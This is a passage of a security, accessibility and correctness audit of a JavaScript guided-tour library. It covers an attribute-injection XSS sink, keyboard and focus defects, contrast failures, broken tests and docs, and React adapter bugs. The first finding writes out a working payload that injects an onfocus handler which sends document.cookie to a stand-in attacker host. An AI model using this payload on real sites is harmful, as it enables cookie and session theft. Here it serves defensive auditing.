findings.impact: `a.label` is escaped via `this._esc()` but `a.action` and `a.variant` are not, and the whole `_buildHTML` return value goes to `el.innerHTML` (line 93) without passing through `_sanitizeHTML` — that function is only applied to `content.html` at line 180. The type does not constrain the value either: packages/core/src/types/index.ts:50 declares `action: 'next' | 'prev' | 'skip' | 'end' | (string & object)`, so any string is accepted at compile time, and nothing validates it at runtime. A flow whose step contains an action value of `next" autofocus onfocus="fetch('//attacker/?c='+document.cookie)` renders as `<button class="gf-btn gf-btn-primary" data-gf-action="next" autofocus onfocus="fetch(...)" type="button">`. The XSS fires with no user interaction because `renderStep` deliberately focuses the first focusable element immediately afterwards (lines 122-125: `const firstFocusable = el.querySelector<HTMLElement>('button, [href], ...'); firstFocusable?.focus()`), so `onfocus` triggers on render. `a.variant` is the same sink. Reachable from any server-fetched flow JSON, from `guideflow push`/`export` round-tripped JSON, and from the DevTools extension's flow import (packages/devtools/src/panel/app.tsx:470-489 `JSON.parse` with no schema validation).
findings.fix: Wrap both interpolations: `data-gf-action="${this._esc(String(a.action))}"` and `gf-btn-${this._esc(String(a.variant ?? 'primary'))}`. Additionally validate `variant` against the literal set `['primary','secondary','ghost']` and fall back to `'primary'` on mismatch, and build the buttons with `document.createElement` + `setAttribute` instead of string concatenation so attribute boundaries cannot be escaped at all.
findings.verifierNote: default-renderer.ts:186-190 is verbatim: `data-gf-action="${a.action}"` and `gf-btn-${a.variant ?? 'primary'}` with only `this._esc(a.label)` escaped. I checked the whole _buildHTML return path — it goes straight to `el.innerHTML = this._buildHTML(...)` at line 93 with no _sanitizeHTML call; _sanitizeHTML is invoked only on content.html at line 180. types/index.ts:50 is `action: 'next' | 'prev' | 'skip' | 'end' | (string & object)`, so any string type-checks, and there is no runtime validation of step.actions anywhere. The auto-focus claim is real: lines 122-125 query the first focusable and call `firstFocusable?.focus()` immediately after render, so an injected `autofocus onfocus=` fires with no user interaction. devtools panel importJSON (app.tsx:469-488) is `JSON.parse` with no schema check, confirming an untrusted ingress.

findings.title: Document-level keyboard handler preventDefaults arrow keys with no check for editable fields, native controls, or IME composition
findings.evidence:
this._keyboardHandler = (e: KeyboardEvent): void => {
      if (!this._active) return
      switch (e.key) {
        case 'ArrowRight':
        case 'ArrowDown':
          e.preventDefault()
          void this.next()
          break
findings.impact: There is no inspection of `e.target`, `e.isComposing`, `e.defaultPrevented`, or `contentEditable` anywhere in this handler, and it is registered on `document` (line 343) for the entire lifetime of the tour. On a `clickThrough: true` step — the documented pattern for "Try clicking the button" / "type your project name here" (apps/docs/guide/spotlight-popover.md) — a user typing in a text input cannot move the caret: pressing ArrowLeft is preventDefault'd and instead jumps the tour to the previous step, destroying whatever they typed. Native `<select>` keyboard navigation, `<input type=range>` sliders, and any listbox/combobox in the highlighted element are equally dead. The missing `e.isComposing` check is an i18n failure specifically: CJK IME candidate selection uses arrow keys, so Japanese/Chinese/Korean users cannot compose text at all during a tour. The `Escape` case additionally preventDefaults, so Escape cannot close a native `<select>` dropdown or cancel an IME composition — it silently abandons the tour instead.
findings.fix: At the top of the handler, bail out when `e.isComposing || e.defaultPrevented`, and when `e.target` matches `input, textarea, select, [contenteditable]:not([contenteditable="false"])` or has a role of textbox/combobox/listbox/slider/spinbutton/menu/grid. Restrict arrow-key navigation to events whose target is inside the popover, or gate the whole feature behind an opt-in config flag; leave Escape global but do not preventDefault it.
findings.verifierNote: tour.ts:324-341 is verbatim; the handler inspects only `e.key`, has no e.target / isComposing / contentEditable / defaultPrevented check, and is bound to `document` at line 343 for the whole tour. The stated clickThrough scenario is undercut by the fact that clickThrough itself is non-functional (overlay still intercepts pointer events), so the reachable paths are Tab-to-background-input and inputs inside `content.html` in the popover — narrower than claimed, but real, and the IME/isComposing gap holds for both. P1 rather than P0 on that reduced reach.

findings.title: Default primary button and all muted-opacity text fail WCAG AA contrast in both light and dark tokens
findings.evidence:
--gf-accent-color: #6366f1;
  --gf-accent-fg: #ffffff;
findings.impact: `.gf-btn-primary { background: var(--gf-accent-color); color: var(--gf-accent-fg); }` renders #ffffff on #6366f1 at `font-size: 13px; font-weight: 500` — relative luminance 0.1851, contrast ratio 4.47:1, below the 4.5:1 required by WCAG 1.4.3 for normal-size text. The Next/Done button, the single most important control in the library, fails out of the box. Worse are the opacity-dimmed elements: `default-renderer.ts:55 .gf-popover-step-info { font-size:12px; opacity:.5 }` and `:63 .gf-btn-ghost { … opacity:.45; font-size:12px }` composite `#111827` over white to roughly rgb(136,140,147) — 3.4:1 — so the "Skip tour" button and the "Step 2 of 5" indicator both fail at 12px. `default-renderer.ts:48 .gf-popover-close { … opacity:.4 }` yields about rgb(160,163,169) on white, 2.5:1, failing even the relaxed 3:1 threshold for non-text UI components (WCAG 1.4.11). findings.title: The entire accessibility e2e suite is non-executable: wrong axe package, wrong baseURL, and an invalid flow shape in the fixture
findings.evidence: import AxeBuilder from 'axe-playwright';
findings.impact: Three independent breakages, any one of which kills the suite. (1) `axe-playwright@2.2.2` (the version actually installed, per apps/e2e/node_modules/axe-playwright/package.json) exports only `injectAxe`, `configureAxe`, `getAxeResults`, `getViolations`, `reportViolations`, `checkA11y`, `DefaultTerminalReporter` — there is no default export and no `AxeBuilder`, so `new AxeBuilder({ page })` on lines 10 and 20 throws `TypeError: AxeBuilder is not a constructor`. The class lives in `@axe-core/playwright`, which is not a dependency. (2) `apps/e2e/playwright.config.ts` sets `baseURL: 'http://localhost:6006'` and boots Storybook, so `page.goto('/')` loads the Storybook manager UI, which has no `#start-btn` — `apps/e2e/fixtures/index.html` is orphaned and never served. (3) Even if it were served, its flow is `{ id, steps: [{ id, title, body, target }] }`, which is not a `FlowDefinition`; `FlowMachine`'s constructor does `if (!(flow.initial in flow.states))` (packages/core/src/fsm/machine.ts:17) and throws `TypeError: Cannot use 'in' operator` because both are `undefined`. The consequence is that every a11y regression catalogued in this report — dangling ARIA refs, missing focus trap, unnamed progressbar — is invisible to CI while the repo advertises an accessibility test suite.
findings.fix: Swap the dependency to `@axe-core/playwright` and import `{ AxeBuilder }`. Add a dedicated Playwright project (or a second `webServer`) that serves `apps/e2e/fixtures/` with a bundler so the `import '…/styles/index.css'` statement resolves, and point its `baseURL` there. Rewrite the fixture flow into the real `{ id, initial, states: { … } }` shape. Then add assertions for focus containment, focus restoration, and the no-title accessible-name case.
findings.verifierNote: All three breakages verified independently. (1) accessibility.spec.ts:2 verbatim; apps/e2e/node_modules/axe-playwright is 2.2.2 and its dist/index.d.ts declares only injectAxe/configureAxe/getAxeResults/getViolations/reportViolations/checkA11y plus `export { DefaultTerminalReporter }` — no default export (grep for `export default|exports.default` in dist/index.js is empty), and @axe-core/playwright is not in apps/e2e/package.json. (2) playwright.config.ts:16 baseURL http://localhost:6006 with webServer `pnpm --filter storybook dev` — `page.goto('/')` hits Storybook, which has no #start-btn; the fixture is never served. (3) The fixture flow is `{id, steps:[...]}` while FlowDefinition (types/index.ts:104-109) requires `initial` + `states`, and FlowMachine's constructor at machine.ts:16 does `if (!(flow.initial in flow.states))`; createGuideFlow().start() (index.ts:231+) performs no normalisation.

findings.title: apps/docs/guide/i18n.md documents an i18n API that does not exist — setLocale(), arbitrary keys, and first-registered-locale fallback are all fictional
findings.evidence:
// Set the active locale
gf.i18n.setLocale('es')
findings.impact: `I18nRegistry` (packages/core/src/i18n/index.ts) has no `setLocale` method — the real one is `use(locale)`, line 37. Following the documented example throws `TypeError: gf.i18n.setLocale is not a function`. The whole page is wrong in four further ways: (1) it registers arbitrary keys like `'tour.welcome.title'` and `'btn.next'`, but `Locale` is a fixed 8-field interface (`next|prev|close|skip|stepOf|done|openHint|closeHint`) and `t(key: keyof Locale)` is typed against it — TypeScript rejects the documented call and at runtime `locale[key] ?? EN[key]` evaluates to `undefined`, so `t('btn.next')` returns `undefined`, not a string; (2) the "Locale Fallback" section claims fallback goes to "the default locale (first registered locale)" and that `register('fr', {})` then `t('greeting')` yields `'Hello'` — the code hardcodes fallback to the built-in `EN` const (line 46) and `register` seeds unknown locales from `{ ...EN }` (line 33), so the documented `'Hello'` result is impossible; (3) the API table documents `getLocale()` as "Get the current locale", but the real `getLocale(locale?)` returns a whole `Locale` string map, and the current locale name is exposed as the `activeLocale` getter; (4) the frontmatter advertises "right-to-left (RTL) text" support, yet the page contains no RTL content and the positioning engine has no direction awareness at all. A user following this page cannot localise anything.
findings.fix: Rewrite apps/docs/guide/i18n.md against the real surface: `register(locale, Partial<Locale>)`, `use(locale)`, `t(key: keyof Locale, vars?)`, `activeLocale`, `getLocale(locale?)`. Enumerate the eight real keys. State that fallback is always to built-in English. Remove the arbitrary-key examples entirely, or implement free-form keys in `I18nRegistry` if that is the intended design. Delete the unsupported RTL claim from the frontmatter or point it at real RTL guidance.
findings.verifierNote: i18n.md:38-39 verbatim, and `setLocale` also appears at 65, 76 and in the API table at 85. I18nRegistry has `use(locale)` (line 37), no setLocale. All four sub-claims verified: `t(key: keyof Locale)` against the fixed 8-field interface (lines 6-15) rejects 'btn.next'/'tour.welcome.title'; fallback is hardcoded `EN[key]` (line 46) and register seeds from `{...EN}` (line 33), so the documented 'Hello' fallback result is impossible; `getLocale(locale?)` returns a Locale map (59-61) with `activeLocale` as the separate getter (55-57); frontmatter advertises RTL with zero RTL content on the page.

findings.title: role=dialog aria-modal=true with no focus trap, no focus restoration, and no inert/aria-hidden on the background
findings.impact: This is the entire focus implementation. `grep -rn "inert\|aria-hidden\|activeElement\|focus-trap"` over packages/ and apps/ returns zero hits in source. A sighted keyboard user opens a 3-step tour, presses Tab four times (Close → Skip → Back → Next), and the fifth Tab lands on a control in the dimmed page behind the overlay — a control the overlay intercepts clicks for, so the focus ring is visible on an element that cannot be activated. Tab continues walking the whole page while `aria-modal="true"` tells screen readers the rest of the document does not exist, producing a contradiction between the AT view and the keyboard view. On `hideStep()` the popover is removed from the DOM (line 130) without ever restoring focus, so focus resets to `document.body` and the next Tab restarts from the top of the page — the user loses their place entirely. WCAG 2.2 AA 2.4.3 (Focus Order) and 2.1.2 (No Keyboard Trap / modal containment) both fail.
findings.fix: In `DefaultRenderer.renderStep`, capture `document.activeElement` before focusing; add a `keydown` handler on the popover that wraps Tab/Shift+Tab across the focusable list; and set `inert` (with an `aria-hidden="true"` fallback) on every direct child of `document.body` except the popover and overlay while a step is shown. Restore the saved element via `.focus()` in `hideStep()` and un-inert the siblings. Mirror the same logic in `packages/react/src/components/GuidePopover.tsx`.
findings.verifierNote: default-renderer.ts:121-125 is verbatim and is the entire focus implementation. My own grep for `inert|aria-hidden|activeElement|focus-trap|focusTrap` over packages/*/src returned zero hits. hideStep() (128-133) removes the node with no focus restoration. Two sub-claims are slightly off: focus lands on a background control that IS still keyboard-activatable (the overlay only blocks pointer events), and the popover is the last body child so Tab exits to browser chrome before wrapping. Core defect (no trap, no restore, no background inertness under aria-modal=true) fully reproduces. Downgrading to P1: serious a11y defect against an advertised feature, but the tour still functions — not on par with the genuinely dead features rated P0 here.

findings.title: Step changes are never announced — no live region, and the core renderer's focus target is the Close button
findings.evidence: el.innerHTML = this._buildHTML(step, content, index, total)
findings.impact: `grep -rn "aria-live\|role=\"status\"\|role=\"alert\"" packages/ apps/` returns no hits in source. On `next()`, the existing dialog element is kept and its `innerHTML` is replaced wholesale; the `role="dialog"` node itself never leaves the accessibility tree, so no AT boundary event fires. Screen-reader users therefore get silence when the tour advances. The only compensating mechanism is the focus move at line 125, which lands on the first focusable element in DOM order — the Close button (the progress bar has no focusables and the header's close button precedes the footer's actions). So the entire announcement a NVDA user receives on every single step of the tour is "Close, button": no title, no body, no "Step 3 of 7". Pressing Enter/Space — the natural reflex after a focus move — ends the tour. In the React renderer nothing is focused at all, so there is no announcement whatsoever. A blind user cannot complete a GuideFlow tour.
findings.fix: Render an `aria-live="polite"` `role="status"` visually-hidden region (created once, outside the dialog) and write `"{stepOf}: {title}. {body}"` into it on each `step:enter`. Change the initial focus target to the dialog container itself (`tabIndex={-1}`) so the accname (title) plus `aria-describedby` (body) are read, or to the primary Next button — never the destructive Close button.
findings.verifierNote: Line 93 verbatim; _popoverEl is reused across steps (_ensurePopover at 147-154 only creates when null), so only innerHTML is swapped and the role=dialog node never leaves the a11y tree. My grep for aria-live/role=status/role=alert across packages/*/src returned nothing. DOM order in _buildHTML confirms the first focusable is the close button (progress bar has none, header close precedes footer buttons) — the repo's own e2e test at accessibility.spec.ts:50-52 asserts exactly that. React renderer focuses nothing at all.

findings.title: No prefers-reduced-motion guard exists anywhere in the codebase
findings.impact: `grep -rn "prefers-reduced-motion" packages/ apps/` returns no hits outside a checklist markdown file. Every animated surface runs unconditionally: the popover scale+translate entry animation above and its duplicate at `packages/core/src/styles/popover.css:154-159`; the infinite pulse in `packages/core/src/engine/hotspot.ts:14-18` (`animation: gf-pulse 2s … infinite` at line 30, a permanently moving 2x-scale beacon); the JS-driven spotlight tweens at `packages/core/src/engine/spotlight.ts:33-38` and the duplicated inline `transition: top 200ms ease, left 200ms ease, width 200ms ease, height 200ms ease, border-radius 200ms ease` at line 160, which slide the dim cutout across the screen on every step change; the progress-bar `transition: width 300ms ease`; and `scrollTargetIntoView`'s hardcoded `behavior: 'smooth'` (popover.ts:128-132). Users with vestibular disorders who have set the OS "reduce motion" preference get the full motion payload, plus an infinitely looping animation that also violates WCAG 2.2.2 (Pause, Stop, Hide). WCAG 2.3.3 (Animation from Interactions, AAA) and the AA expectation for honouring the media query both fail.
findings.fix: Add `@media (prefers-reduced-motion: reduce) { .gf-popover, .gf-popover[data-enter], .gf-progress-bar-fill, [data-gf-spotlight-cutout], .gf-hint-badge { animation: none !important; transition: none !important; } .gf-hotspot-beacon { animation: none; } }` to popover.css, the renderer's inlined POPOVER_CSS, hotspot.ts's HOTSPOT_CSS and spotlight.ts's SPOTLIGHT_CSS. Because the spotlight also writes inline transitions in `_ensureElements`, gate that string on `window.matchMedia('(prefers-reduced-motion: reduce)').matches`. Do the same for `scrollTargetIntoView`, passing `behavior: 'auto'` when reduced motion is requested.
findings.verifierNote: My own repo-wide grep for `prefers-reduced-motion|reduce.motion` (all files, excluding node_modules/dist) returned zero hits — even the checklist markdown the auditor allowed for. Evidence at default-renderer.ts:40-45 verbatim; duplicated at popover.css ~154-161; hotspot.ts:14-18 keyframes + line 30 `animation: gf-pulse 2s ... infinite`; spotlight.ts:33-38 and the inline duplicate at line 160; progress-bar `transition: width 300ms ease` at line 53; popover.ts:127-132 hardcoded `behavior: 'smooth'`. All unconditional. The infinite pulse independently implicates WCAG 2.2.2.

findings.title: The popover is positioned once and never repositioned on scroll, so it detaches from the spotlight
findings.evidence: this._position(el, targetEl, step.placement ?? 'bottom')
findings.impact: This is the only call site of `_position`, invoked once inside `renderStep`. `DefaultRenderer` registers no `scroll`, `resize`, or `ResizeObserver` listener anywhere in the file, and there is no scroll lock in the library (`grep -rn "overflow\|body.style" packages/core/src packages/react/src` finds only unrelated hits). Meanwhile `SpotlightOverlay._attachObservers` (spotlight.ts:208-222) *does* track scroll and resize, so the cutout follows the target while the fixed-position popover stays frozen. A single mouse-wheel notch separates the highlight from its explanatory text; scroll far enough and the popover sits over unrelated content or floats over a sticky header. On mobile, address-bar collapse and on-screen-keyboard resize produce the same split. The React version listens for `resize` only (`GuidePopover.tsx:105-108`) and has the same scroll defect.
findings.fix: Attach `window.addEventListener('scroll', reposition, { passive: true, capture: true })` plus a `ResizeObserver` on the target in `renderStep`, tearing both down in `hideStep()`; reuse the pattern already in `SpotlightOverlay._attachObservers`. Add the scroll listener to the React `useEffect` at GuidePopover.tsx:105. Separately, add an opt-in scroll lock (`overflow: hidden` on `documentElement` with scrollbar-width compensation) for non-clickThrough steps.
findings.verifierNote: Read default-renderer.ts end to end: line 119 is the only _position call site, inside renderStep, and the file registers no scroll/resize listener and no ResizeObserver. By contrast SpotlightOverlay._attachObservers (spotlight.ts:208-222) binds both scroll (capture, passive) and resize plus a ResizeObserver, so the cutout tracks the target while the fixed popover does not. GuidePopover.tsx:105-108 registers only `resize`. No scroll lock exists.

findings.title: React <GuidePopover> never moves focus into the dialog at all
findings.impact: GuidePopover.tsx contains no `.focus()` call, no `autoFocus`, and no focus-management `useEffect` — only the two positioning effects at lines 101-108. When a React tour starts, the dialog is portalled into `document.body` while focus stays on whatever button the user clicked to start the tour. A screen-reader user hears nothing: there is no live region and no focus move, so the popover is silently inserted and the virtual cursor stays where it was. A keyboard user must Tab through every remaining focusable element on the page to reach the tour's Next button. This is strictly worse than the core renderer, which at least focuses something, and the two renderers are documented as interchangeable.
findings.fix: Add a `useEffect` keyed on `activeStep.step.id` that focuses the popover container (`tabIndex={-1}` on the wrapper) or the primary action button, saves the prior `document.activeElement`, and restores it in the cleanup. Share the implementation with the core renderer rather than duplicating it.
findings.verifierNote: Read GuidePopover.tsx in full: role=dialog/aria-modal=true at 123-124, and `grep -rn '\.focus()\|autoFocus' packages/react/src packages/vue/src packages/svelte/src` returns nothing. The only effects are the two positioning ones at 101-108. No live region either (aria-live grep empty). Confirmed. Severity P1 for the same calibration reason as the core focus finding.

findings.title: rtl.css applies flex-direction: row-reverse inside a dir=rtl container, double-reversing the footer back into LTR order
findings.impact: `flex-direction: row` is already direction-relative: inside a `dir="rtl"` subtree, the main axis runs right-to-left automatically, so `.gf-popover-actions` (Skip, Back, Next) already lays out correctly with no CSS at all. Explicitly setting `row-reverse` reverses it a second time, producing left-to-right visual order in an RTL document — the exact opposite of the file's stated purpose. In an Arabic or Hebrew UI the Next button ends up on the left and Skip on the right, inverting the user's directional expectation for "forward". The neighbouring rule `[dir="rtl"] .gf-hint-badge { right: auto; }` is a pure no-op: `hint.ts:131-132` positions the badge with inline `left`/`top`, which this never touches. The whole file is 20 lines and untested.
findings.fix: Delete the `row-reverse` rules — logical flex ordering already handles RTL. Replace the `.gf-hint-badge` no-op with real logical positioning (compute the badge offset from the target's inline-start edge when `getComputedStyle(document.documentElement).direction === 'rtl'`). Add an RTL story to Storybook rendering the popover under `dir="rtl"`.
findings.verifierNote: rtl.css:2-4 verbatim (the file is 20 lines). `flex-direction: row` is already direction-relative, so inside dir=rtl the footer's space-between layout mirrors correctly with no CSS; row-reverse reverses it again back to LTR visual order. findings.title: <GuidePopover> reads the module-global defaultI18n, so gf.i18n.use()/register() has no effect on its strings

findings.impact: `createGuideFlow` builds a *fresh* registry per instance (`const i18n = new I18nRegistry()`, core/src/index.ts:162) and exposes it as `gf.i18n`, while `defaultI18n` is a separate module singleton (core/src/i18n/index.ts:64). findings.title: <GuidePopover> positions in useEffect (paints at 0,0 for a frame) and never tracks scroll, contradicting its own API doc
findings.impact: Two defects. (1) `position` initialises to `{ x: 0, y: 0, placement: 'bottom' }` (line 48) and is corrected in a passive `useEffect`, which runs *after* the browser paints — so every step transition flashes the popover at the top-left corner of the viewport for one frame before it jumps to the target. Measurement-then-position must run in `useLayoutEffect`. (2) Only `resize` is listened for. apps/docs/api/react/guide-popover.md:40 promises "Handles positioning and scroll tracking automatically" — there is no scroll listener, so any user scroll after the step renders leaves the `position: fixed` popover stranded while its target moves away underneath it. Core's DefaultRenderer has the same missing scroll listener, so this is a library-wide gap being advertised as a feature.
findings.fix: Swap both effects to `useLayoutEffect`, and add `window.addEventListener('scroll', updatePosition, { passive: true, capture: true })` (capture so scrolls inside scroll containers are caught) alongside resize — mirroring what `HotspotManager` already does correctly at core/src/engine/hotspot.ts:119-121. Delete or implement the scroll-tracking claim in the docs.
findings.verifierNote: GuidePopover.tsx:100-108 is verbatim: updatePosition runs in a passive useEffect and the only listener registered is 'resize'. Initial state is `{ x: 0, y: 0, placement: 'bottom' }` at line 48, so the first paint after each step:enter lands at viewport 0,0. guide-popover.md:40 is verbatim "Handles positioning and scroll tracking automatically". I checked core for a compensating listener: DefaultRenderer._position (default-renderer.ts:196-226) is called once from renderStep and registers no scroll or resize handler either, so the library-wide gap claim holds too.

findings.title: <GuidePopover> does not subscribe to tour:pause, so gf.pause() hides the core popover but leaves the React one on screen
findings.impact: `TourEngine.pause()` (core/src/engine/tour.ts:167-175) calls `this._spotlight.hide()` and `this._renderer.hideStep()` and emits only `tour:pause` — it deliberately does *not* emit `step:exit` so the flow position is preserved. GuidePopover, `<TourStep>` (TourStep.tsx:36-39) and `useTourStep` (use-tour-step.ts:35-42) all key off `step:exit`/`tour:abandon`/`tour:complete` and none of them listen to `tour:pause`. Result: calling `gf.pause()` hides the spotlight and the core popover but leaves the React popover and every `<TourStep>` body rendered — the exact opposite of what pause means. `resume()` re-emits `step:enter` so it happens to un-break itself, masking the bug in casual testing.
findings.fix: Add `gf.on('tour:pause', () => setActiveStep(null))` and `gf.on('tour:resume', ...)` handling to GuidePopover, TourStep and useTourStep. Then expose pause/resume properly across all three adapters (see the pause/resume parity finding).
findings.verifierNote: TourEngine.pause() at engine/tour.ts:167-175 reads exactly as described: it hides spotlight and renderer and emits only 'tour:pause' — no step:exit. GuidePopover.tsx:73-75 (verbatim) subscribes to step:exit/tour:abandon/tour:complete only; TourStep.tsx:36-39 and use-tour-step.ts:35-42 do the same; `grep tour:pause` finds no hit in packages/react/src. resume() at tour.ts:178-185 re-renders the current step, which does mask the bug. Fully reproduced.

findings.title: packages/react/src contains no 'use client' directive while the docs claim Next.js App Router support
findings.evidence:
import { createGuideFlow, type GuideFlowConfig, type GuideFlowInstance } from '@guideflow/core'
import React, { createContext, useContext, useMemo, useRef, type ReactNode } from 'react'
findings.impact: apps/docs/guide/index.md:36 states "**SSR safe** — every DOM access is guarded; works in Next.js App Router, Nuxt, and SvelteKit". `grep -rn "use client" packages/react/src/` returns nothing, and the tsup banner (packages/react/tsup.config.ts) emits only `/* @guideflow/react — MIT License */`. Importing `TourProvider`, `useTour`, or any component from a Next.js App Router Server Component fails the build with "You're importing a component that needs `createContext`. It only works in a Client Component but none of its parents are marked with 'use client'". There is also no App Router / RSC guidance anywhere in apps/docs.
findings.fix: Add `'use client'` as the first line of every file under packages/react/src (or emit it via `banner: { js: "'use client';" }` in tsup.config.ts — note tsup strips top-of-file directives during bundling, so the banner is the reliable route). findings.verifierNote: `grep -rn "use client" packages/` returns nothing (exit 1, no matches) and packages/react/tsup.config.ts emits only the MIT banner — no directive-preserving config. context.tsx:6 does import createContext as quoted. apps/docs/guide/index.md:36 is verbatim the SSR/App-Router claim. Downgrading to P1: the package is not shipped-broken — the standard workaround (consumer adds 'use client' to their own wrapper) is one line and is how most React libs were consumed pre-directive; the defect is a real packaging/DX gap plus a false doc claim, not an unusable build.

findings.title: TourProvider never calls instance.destroy() — a document-level keydown listener and the popover DOM survive unmount
findings.impact: There is no `useEffect(() => () => gf.destroy(), [gf])`. When a tour is active, core has attached `document.addEventListener('keydown', this._keyboardHandler)` (core/src/engine/tour.ts:343) which maps ArrowRight/ArrowDown to `next()` and Escape to `skip()`, and DefaultRenderer has appended a `div.gf-popover` to `document.body`. Unmounting the provider mid-tour (route change in an SPA, a modal that hosts its own provider, a micro-frontend teardown) leaves both alive: arrow keys keep advancing an invisible tour and the orphaned popover keeps floating over the page at z-index 999999, swallowing clicks. @guideflow/svelte is the only adapter that exposes any teardown (`destroy()`).
findings.fix: In context.tsx, add `useEffect(() => { if (instance) return; return () => gf.destroy() }, [gf, instance])` so provider-owned instances are destroyed but caller-supplied ones are left alone. Add a regression test that unmounts the provider mid-tour and asserts the keydown handler no longer advances the flow.
findings.verifierNote: context.tsx:27-39 contains no useEffect at all — the quoted return is the entire body after useMemo, so gf.destroy() is never called. Verified the leak is real: TourEngine._attachKeyboard registers `document.addEventListener('keydown', this._keyboardHandler)` at engine/tour.ts:343 with ArrowRight→next and Escape→skip (lines 327-340), and it is only removed in _detachKeyboard, called from _doEnd (line 303) and destroy (line 188) — neither of which runs on unmount. DefaultRenderer's popover is likewise only removed in hideStep(). Svelte is indeed the only adapter exposing destroy() (svelte/src/index.ts:101-104).

findings.title: GuidePopover calls useId(), which does not exist in React 17 — a version inside the declared peer range
findings.impact: packages/react/package.json:61 declares `"react": "^17.0.0 || ^18.0.0 || ^19.0.0"`. `useId` was introduced in React 18; on React 17 the named import resolves to `undefined` and rendering `<GuidePopover>` throws `TypeError: useId is not a function`. The same range problem applies to the `React.JSX.Element` return annotations used across context.tsx:27, GuidePopover.tsx:44, TourStep.tsx:30 and ConversationalPanel.tsx:40 — the `React.JSX` namespace does not exist in @types/react 17 (it was the global `JSX` there), so React 17 consumers cannot even type-check the package. Nothing in CI installs React 17, so this is invisible.
findings.fix: Either drop `^17.0.0` from the peerDependencies range (React 17 support is unverifiable without a matrix job), or replace `useId()` with a module-local counter fallback (`const useIdCompat = React.useId ?? (() => useMemo(() => `gf-${++counter}`, []))`) and switch return annotations to the global `JSX.Element`. Add a CI job that installs react@17 / react@19 and runs `type-check`.
findings.verifierNote: GuidePopover.tsx:8 imports useId from 'react' and lines 51-52 call it; package.json:61 declares the peer range `"react": "^17.0.0 || ^18.0.0 || ^19.0.0"` while devDependencies pin react ^18.2.0 and @types/react ^18.2.60 (lines 67,70), so React 17 is never exercised. useId is React 18+, and React.JSX.Element annotations do appear at context.tsx:27, GuidePopover.tsx:44, TourStep.tsx:30 and ConversationalPanel.tsx:40. Downgrading to P1: the runtime crash is confined to one optional component on a peer version nothing in the repo installs (hooks, TourProvider and TourStep work on 17), and the React.JSX d.ts problem is invisible under the near-universal skipLibCheck:true.

findings.title: AnthropicProvider defaults to a Claude model whose retirement date has passed
findings.evidence: model: opts.model ?? 'claude-3-haiku-20240307',
findings.impact: `claude-3-haiku-20240307` is deprecated with a retirement date of 2026-04-19; that date is now past, so the id returns HTTP 404 `not_found_error`. A user who follows the documented setup — `createAI(new AnthropicProvider({ apiKey }), gf)` with no `model` override — gets a 404 on every single call. In `generateSteps` the SDK error propagates out of `complete()` before the `try` around `JSON.parse`, so `brain.generate()` rejects and emits `error`; in `detectIntent` it does the same and produces an unhandled rejection (see `brain-unhandled-rejection`). The Anthropic provider is non-functional out of the box.
findings.fix: Change the default to a current id (`claude-haiku-4-5` for the cheap/fast tier the comment intends, or `claude-opus-5`), update the `/** Default: claude-3-haiku-20240307 */` JSDoc on line 13, and update the two docs tables that repeat the stale value (apps/docs/guide/ai.md:15, apps/docs/api/ai/providers.md:52). Add a CI check or a note in CONTRIBUTING that model defaults need review each release, since a hardcoded dated snapshot will retire again.
findings.verifierNote: anthropic.ts:29 is verbatim `model: opts.model ?? 'claude-3-haiku-20240307',` and the doc comment at line 13 confirms it is the documented default. The Anthropic model catalog does list claude-3-haiku-20240307 as Deprecated with retirement Apr 19, 2026 — past today's 2026-07-30 — so shipping it as a default is definitely wrong. But the catalog still files it under 'Deprecated (retiring soon)' rather than 'Retired', so I could not independently reproduce the specific 'HTTP 404 not_found_error on every single call / non-functional out of the box' claim. Downstream chain is correct though: complete() awaits the SDK before the try/JSON.parse (lines 44-50 vs 62-67), so an SDK error propagates out of generateSteps/detectIntent.

findings.title: Debounced detectIntent produces an unhandled promise rejection on every provider failure
findings.evidence: void this.detectIntent();
findings.impact: `detectIntent()` re-throws after emitting: `this.emit('error', error); throw error;` (brain.ts:190-194). The `void` operator discards the promise without attaching a rejection handler, so every failed call becomes an unhandled promise rejection. With an expired key, a rate limit, a network blip, or the retired Anthropic default model (see `anthropic-default-model-retired`), a watching user generates one unhandled rejection per pause — a stream of `Uncaught (in promise) Error` entries in the console, and a fired `window.onunhandledrejection` that many apps wire to Sentry/Bugsnag, flooding the host application's error reporting. Registering an `error` listener does not help: the emit and the throw are independent, so the rejection happens regardless.
findings.fix: Change line 180 to `this.detectIntent().catch(() => { /* already emitted via 'error' */ });`, or split the internal path from the public one: have a private `_detectIntent()` that emits and resolves, called by `scheduleDetect`, and keep the throwing behaviour only on the public `detectIntent()` that a caller awaits. Add a test that asserts no unhandled rejection when a rejecting provider is used with `watch()` — the current brain.test.ts only exercises the awaited path (lines 77-89, 134-145).
findings.verifierNote: brain.ts:180 verbatim `void this.detectIntent();` inside the debounce callback, and detectIntent's catch at 190-194 does `this.emit('error', error); throw error;`. `void` discards the promise without a .catch, so every provider failure on the watch path is an unhandled rejection. Verified the emit and the throw are independent statements, so an 'error' listener genuinely does not suppress it — the listener runs and then the rejection still escapes. Contrast with generate()/chat(), which are awaited by the caller.

findings.title: Behavioural intent is never connected to auto-triggering a flow anywhere in the repo
findings.evidence: - **Intent detection** — passively monitor user behaviour and surface help when they get stuck
findings.impact: README.md:22 and apps/docs/guide/ai-intent.md:8 ("automatically surfacing the right tour at the right moment") promise behaviour-triggered tours, but nothing in the codebase closes the loop. `GuideBrain` emits `intent:detected` and stops; `createAI` (index.ts:59-77) wires only `destroy`, never a listener that calls `instance.start()`. Grepping the whole repo for `watch()`, `detectIntent`, and `compress` outside packages/ai/src returns zero hits — no framework adapter, no demo, no e2e test, and no docs example that actually runs. The demo app imports `GuideBrain` as a type and calls only `gf.ai.chat` (apps/demo/src/App.tsx:244) and `gf.ai.generate` (:255); its AI section (:505-566) exercises generate, chat, and `ConversationalPanel` but has no intent-detection UI at all. So the differentiating feature reduces to "an event fires that the user must hand-wire", and the docs snippets that would hand-wire it are themselves broken (see `docs-guide-ai-broken-api`).

To implement: add an opt-in `GuideBrainOptions.intentTriggers?: Array<{ type: IntentSignal['type']; minConfidence: number; flow: FlowDefinition | string }>` and have `createAI` subscribe to `intent:detected` and call `instance.start(flow)` when a trigger matches (with a per-flow once-per-session guard via `instance.progress`). Add a working intent-detection panel to apps/demo/src/App.tsx alongside the existing generate/chat sections, and an e2e test in apps/e2e/tests. To scope down: reword README.md:22 and apps/docs/guide/ai-intent.md to "emits intent signals you can subscribe to" and show a correct, compiling handler.
